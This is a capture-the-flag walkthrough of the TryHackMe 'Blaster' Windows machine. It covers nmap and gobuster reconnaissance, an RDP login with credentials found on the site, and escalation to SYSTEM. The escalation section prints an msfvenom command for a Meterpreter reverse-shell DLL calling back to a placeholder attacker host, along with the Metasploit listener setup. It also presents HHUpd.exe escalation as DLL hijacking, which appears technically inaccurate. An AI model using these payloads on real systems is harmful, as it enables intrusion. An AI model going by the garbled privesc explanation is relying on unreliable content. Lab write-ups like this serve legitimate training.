# 💥 Blaster - TryHackMe

## 📌 Information

| Field          | Value                                                  |
| -------------- | ------------------------------------------------------ |
| **Machine**    | Blaster                                                |
| **Platform**   | TryHackMe                                              |
| **Difficulty** | Easy                                                   |
| **OS**         | Windows                                                |
| **Category**   | Web Enumeration / Remote Access / Privilege Escalation |

---

# 🎯 Objective

Gain Administrator access to the Windows machine by enumerating exposed services, obtaining an initial foothold, and escalating privileges to retrieve the flags.

---

# 🛰️ Reconnaissance

The first step was identifying open ports and running services using **Nmap**.

### Scan

```bash
nmap -sC -sV -oN scan.txt MACHINE_IP
```

### Results

| Port | Service | Version                       |
| ---- | ------- | ----------------------------- |
| 80   | HTTP    | Microsoft IIS                 |
| 3389 | RDP     | Microsoft Terminal Services   |
| 7680 | HTTP    | Windows Delivery Optimization |

### Notes

* IIS web server was accessible.
* Remote Desktop Protocol (RDP) was exposed.
* The website contained information useful for further enumeration.

---

# 🔍 Enumeration

I explored the web application manually and inspected the available pages.

Interesting findings included:

* Default IIS pages.
* Hidden directories.
* Public information disclosing potential usernames or credentials.

Directory enumeration:

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Useful directories discovered:

```text
/retro
```

The **Retro** website contained several blog posts with information that helped identify valid credentials.

---

# 💥 Exploitation

Using the credentials gathered during enumeration, I connected to the target through **Remote Desktop Protocol (RDP)**.

Linux:

```bash
xfreerdp /u:USERNAME /p:PASSWORD /v:MACHINE_IP
```

or on Windows:

```text
mstsc.exe
```

### Result

A successful desktop session was established with a standard user account.

---

# ⬆️ Privilege Escalation

After gaining access, local enumeration was performed.

Useful commands:

```powershell
whoami
```

```powershell
systeminfo
```

```powershell
whoami /priv
```

The system contained the **HHUpd.exe** executable, which is vulnerable to DLL hijacking.

A malicious DLL was generated using **msfvenom**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll > hhupd.dll
```

Start a Metasploit listener:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run
```

After placing the malicious DLL in the appropriate directory and executing the vulnerable application, a new Meterpreter session was obtained.

Verify privileges:

```powershell
getuid
```

Output:

```text
NT AUTHORITY\SYSTEM
```

---

# 🚩 Flags

## User Flag

```text
<user_flag>
```

## Root / Administrator Flag

```text
<administrator_flag>
```

---

# 📚 What I Learned

* Windows service enumeration.
* IIS web application reconnaissance.
* Directory brute forcing with Gobuster.
* Using RDP for initial access.
* Windows privilege enumeration.
* DLL Hijacking for privilege escalation.
* Meterpreter post-exploitation.

---

# 🛠️ Tools Used

* Nmap
* Gobuster
* xfreerdp / Remote Desktop
* Metasploit Framework
* msfvenom
* Meterpreter

---

# 📖 MITRE ATT&CK

| Technique | Description                |
| --------- | -------------------------- |
| T1046     | Network Service Discovery  |
| T1078     | Valid Accounts             |
| T1021.001 | Remote Desktop Protocol    |
| T1574.001 | DLL Search Order Hijacking |
| T1105     | Ingress Tool Transfer      |

---

# 📷 Screenshots

Recommended screenshots:

* Nmap scan
* Gobuster results
* Retro website
* RDP login
* User desktop
* DLL generation
* Meterpreter session
* SYSTEM shell
* Flags

---

# ✅ Summary

Blaster is a beginner-friendly Windows machine that focuses on web enumeration, credential discovery, Remote Desktop access, and Windows privilege escalation through DLL hijacking. The room provides practical experience with post-exploitation techniques, privilege enumeration, and achieving **NT AUTHORITY\SYSTEM** on a Windows target.
